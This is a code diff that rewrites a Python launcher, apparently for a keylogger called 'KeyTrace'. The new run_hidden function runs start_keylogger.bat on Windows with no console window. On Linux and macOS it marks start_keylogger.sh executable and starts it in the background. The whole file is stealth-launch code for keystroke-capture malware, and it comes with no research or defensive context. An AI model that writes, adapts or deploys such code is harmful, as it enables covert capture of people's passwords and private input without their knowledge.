@@ -1,39 +1,28 @@
-import subprocess
-import sys
 import os
+import subprocess
 import platform
 
-def run_in_background():
-    system = platform.system()
-    script_path = os.path.join(os.path.dirname(__file__), "main.py")
-    base_cmd = [sys.executable, script_path, "--silent"]
-    
-    if system == "Windows":
-        # Prefer pythonw.exe to hide console
-        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-        if os.path.exists(pythonw):
-            subprocess.Popen(
-                [pythonw, script_path, "--silent"],
-                creationflags=subprocess.DETACHED_PROCESS,
-                cwd=os.path.dirname(__file__)
-            )
-        else:
-            subprocess.Popen(
-                base_cmd,
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                cwd=os.path.dirname(__file__)
-            )
+def run_hidden():
+    base_dir = os.path.dirname(os.path.abspath(__file__))
 
-    elif system in ["Linux", "Darwin"]:  # macOS = Darwin
+    if platform.system() == "Windows":
+        bat_file = os.path.join(base_dir, "start_keylogger.bat")
+        if not os.path.exists(bat_file):
+            raise FileNotFoundError("start_keylogger.bat not found!")
         subprocess.Popen(
-            base_cmd,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            cwd=os.path.dirname(__file__)
+            ["cmd", "/c", bat_file],
+            creationflags=subprocess.CREATE_NO_WINDOW
         )
+
+    elif platform.system() in ["Linux", "Darwin"]:
+        sh_file = os.path.join(base_dir, "start_keylogger.sh")
+        if not os.path.exists(sh_file):
+            raise FileNotFoundError("start_keylogger.sh not found!")
+        os.chmod(sh_file, 0o755)
+        subprocess.Popen(["bash", sh_file])
+
     else:
-        print(f"[!] Unsupported platform: {system}")
+        raise OSError(f"Unsupported OS: {platform.system()}")
 
 if __name__ == "__main__":
-    print("[*] Launching KeyTrace in background mode...")
-    run_in_background()
+    run_hidden()
